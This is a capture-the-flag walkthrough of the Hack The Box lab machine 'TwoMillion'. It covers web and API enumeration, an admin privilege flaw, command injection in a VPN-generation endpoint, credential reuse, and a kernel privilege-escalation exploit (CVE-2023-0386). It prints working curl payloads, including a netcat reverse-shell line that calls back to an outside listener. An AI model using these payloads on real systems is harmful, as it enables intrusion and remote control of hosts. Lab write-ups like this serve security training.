https://app.hackthebox.com/machines/TwoMillion

## Enumeration:

#### NMAP result:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-24 02:13 CEST  
Nmap scan report for 10.129.229.66  
Host is up (0.021s latency).  
Not shown: 65533 closed tcp ports (reset)  
PORT   STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)  
80/tcp open  http    nginx  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 21.81 seconds
```

service SSH + WEB

#### WEB dirb :
```
---- Scanning URL: http://2million.htb/ ----  
+ http://2million.htb/404 (CODE:200|SIZE:1674)                                                                        
+ http://2million.htb/api (CODE:401|SIZE:0)                                                                           
==> DIRECTORY: http://2million.htb/assets/                                                                            
==> DIRECTORY: http://2million.htb/controllers/                                                                       
==> DIRECTORY: http://2million.htb/css/                                                                               
==> DIRECTORY: http://2million.htb/fonts/                                                                             
+ http://2million.htb/home (CODE:302|SIZE:0)                                                                          
==> DIRECTORY: http://2million.htb/images/                                                                            
+ http://2million.htb/invite (CODE:200|SIZE:3859)                                                                     
==> DIRECTORY: http://2million.htb/js/                                                                                
+ http://2million.htb/login (CODE:200|SIZE:3704)                                                                      
+ http://2million.htb/logout (CODE:302|SIZE:0)                                                                        
+ http://2million.htb/register (CODE:200|SIZE:4527)                                                                   
==> DIRECTORY: http://2million.htb/views/                                                                             
                                                                                                                     
---- Entering directory: http://2million.htb/assets/ ----  
                                                                                                                     
---- Entering directory: http://2million.htb/controllers/ ----  
                                                                                                                     
---- Entering directory: http://2million.htb/css/ ----  
==> DIRECTORY: http://2million.htb/css/flags/                                                                         
                                                                                                                     
---- Entering directory: http://2million.htb/fonts/ ----  
                                                                                                                     
---- Entering directory: http://2million.htb/images/ ----  
                                                                                                                     
---- Entering directory: http://2million.htb/js/ ----  
                                                                                                                     
---- Entering directory: http://2million.htb/views/ ----  
+ http://2million.htb/views/index.php (CODE:200|SIZE:64952)                                                                                                       
---- Entering directory: http://2million.htb/css/flags/ ----                          
-----------------  
END_TIME: Wed Jun 24 02:51:05 2026  
DOWNLOADED: 41508 - FOUND: 8
```

The website provides a way to register for the service, but it requires an invitation code.

By digging into the Website ressources I found this :

```
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),0,{}))
```

let's deobfuscate this :

```
function verifyInviteCode(code) {
    var formData = { "code": code };
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function(response) {
            console.log(response);
        },
        error: function(response) {
            console.log(response);
        }
    });
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function(response) {
            console.log(response);
        },
        error: function(response) {
            console.log(response);
        }
    });
}
```

I can how to make one if I curl this :

```
curl -X POST https://2million.htb/api/v1/invite/how/to/generate

curl -X POST http://2million.htb/api/v1/invite/how/to/generate    
{"0":200,"success":1,"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\  
/trarengr","enctype":"ROT13"},"hint":"Data is encrypted ... We should probbably check the encryption type in order t  
o decrypt it..."}
```

rot13 : `Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr` => `In order to generate the invite code, make a POST request to \/api\/v1\/invite`

Okay so now let's try :

```
curl -X POST http://2million.htb/api/v1/invite/generate  
{"0":200,"success":1,"data":{"code":"SUxMVjUtQ1owWlItNVY0TUQtM0pUSjg=","format":"encoded"}}
```

Nice i got the code (B64) ! ILLV5-CZ0ZR-5V4MD-3JTJ8

I can create an account ! :

dummy@htb.com / test

I keep in mind this info :

```
Important Announcement: We are currently performing database migrations. For this reason some of the website's features will be unavailable. We apologize for the inconvenience.
```

Maybe a database flaw ?

I try another dirb since I'm logged in :

```
dirb http://2million.htb/home/ -c "PHPSESSID=v0l796e2fjkcdu34212i302l91"

---- Scanning URL: http://2million.htb/home/ ----  
+ http://2million.htb/home/access (CODE:200|SIZE:17232)                                                               
+ http://2million.htb/home/changelog (CODE:200|SIZE:43989)                                                            
+ http://2million.htb/home/rules (CODE:200|SIZE:14538)
```

this looks interresting : `http://2million.htb/home/access

I can download a vpn client, that might be useful, I'll keep it in mind.

I will explore the API exposed by the VPN client download !

```
curl -b "PHPSESSID=v0l796e2fjkcdu34212i302l91" http://2million.htb/api/v1 -s | jq      
{  
 "v1": {  
   "user": {  
     "GET": {  
       "/api/v1": "Route List",  
       "/api/v1/invite/how/to/generate": "Instructions on invite code generation",  
       "/api/v1/invite/generate": "Generate invite code",  
       "/api/v1/invite/verify": "Verify invite code",  
       "/api/v1/user/auth": "Check if user is authenticated",  
       "/api/v1/user/vpn/generate": "Generate a new VPN configuration",  
       "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",  
       "/api/v1/user/vpn/download": "Download OVPN file"  
     },  
     "POST": {  
       "/api/v1/user/register": "Register a new user",  
       "/api/v1/user/login": "Login with existing user"  
     }  
   },  
   "admin": {  
     "GET": {  
       "/api/v1/admin/auth": "Check if user is admin"  
     },  
     "POST": {  
       "/api/v1/admin/vpn/generate": "Generate VPN for specific user"  
     },  
     "PUT": {  
       "/api/v1/admin/settings/update": "Update user settings"  
     }  
   }  
 }  
}
```

I can update my setting ?

`"/api/v1/admin/settings/update": "Update user settings" 

I hope that this is open without any restriction !

```
curl -b "PHPSESSID=v0l796e2fjkcdu34212i302l91" -X PUT http://2million.htb/api/v1/admin/settings/update -s -H "Co  
ntent-Type: application/json"  | jq     
{  
 "status": "danger",  
 "message": "Missing parameter: email"  
}
```

email :

```
curl -b "PHPSESSID=v0l796e2fjkcdu34212i302l91" -X PUT http://2million.htb/api/v1/admin/settings/update -s -H "Co  
ntent-Type: application/json" -d '{"email": "dummy@htb.com"}' | jq  
  
;  
{  
 "status": "danger",  
 "message": "Missing parameter: is_admin"  
}
```

Perfect ! :

```
curl -b "PHPSESSID=v0l796e2fjkcdu34212i302l91" -X PUT http://2million.htb/api/v1/admin/settings/update -s -H "Co  
ntent-Type: application/json" -d '{"email": "dummy@htb.com", "is_admin": 1}' | jq      
  
;  
{  
 "id": 13,  
 "username": "zeroz",  
 "is_admin": 1  
}
```

Now i will check other endpoints :

```
curl -b "PHPSESSID=v0l796e2fjkcdu34212i302l91" -X POST http://2million.htb/api/v1/admin/vpn/generate -s -H "Cont  
ent-Type: application/json" | jq  
{  
 "status": "danger",  
 "message": "Missing parameter: username"  
}
```

username :

```
curl -b "PHPSESSID=v0l796e2fjkcdu34212i302l91" -X POST http://2million.htb/api/v1/admin/vpn/generate -H "Content  
-Type: application/json" -s -d '{"username": "zeroz"}' 
       
client  
dev tun  
proto udp  
remote edge-eu-free-1.2million.htb 1337  
resolv-retry infinite  
nobind  
persist-key  
persist-tun  
remote-cert-tls server  
comp-lzo  
verb 3  
data-ciphers-fallback AES-128-CBC  
data-ciphers AES-256-CBC:AES-256-CFB:AES-256-CFB1:AES-256-CFB8:AES-256-OFB:AES-256-GCM  
tls-cipher "DEFAULT:@SECLEVEL=0"  
auth SHA256  
key-direction 1  
<ca>  
-----BEGIN CERTIFICATE-----  
MIIGADCCA+igAwIBAgIUQxzHkNyCAfHzUuoJgKZwCwVNjgIwDQYJKoZIhvcNAQEL  
[...]
```

this is clearly not the php that generate this output... maybe a command injection ? `;id #` :

```
curl -b "PHPSESSID=v0l796e2fjkcdu34212i302l91" -X POST http://2million.htb/api/v1/admin/vpn/generate -H "Content  
-Type: application/json" -s -d '{"username": "zeroz;id #"}'  
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

RCE confirmed ! :
```
curl -b "PHPSESSID=v0l796e2fjkcdu34212i302l91" -X POST http://2million.htb/api/v1/admin/vpn/generate -H "Conten  
t-Type: application/json" -s -d '{"username": "zeroz; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.1  
84 1338 >/tmp/f #"}'
```

## User :

I run linpeas

ports :
```
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:11211         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1135/nginx: worker  
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      1135/nginx: worker  
tcp6       0      0 :::22                   :::*                    LISTEN      -     
```

Some DB creds :

```
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

The other user of this machine is admin :

```
admin:x:1000:1000::/home/admin:/bin/bash
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/bin/bash
```

Maybe the admin got the same credentials for the DB and SSH ? I tried and it worked !

## ROOT

Something interresting, the admin got a mail let's see this one : `/var/mail/admin`

```
Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```

CVE-2023-0386, I will get an exploit and run it : https://github.com/puckiestyle/CVE-2023-0386

```
make all
./fuse ./ovlcap/lower ./gc
```

In a second terminal :

```
admin@2million:/tmp$ ./exp
uid:1000 gid:1000
[+] mount success
total 8
drwxrwxr-x 1 root   root     4096 Jun 24 03:10 .
drwxrwxr-x 6 root   root     4096 Jun 24 03:10 ..
-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
[+] exploit success!
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@2million:/tmp#
```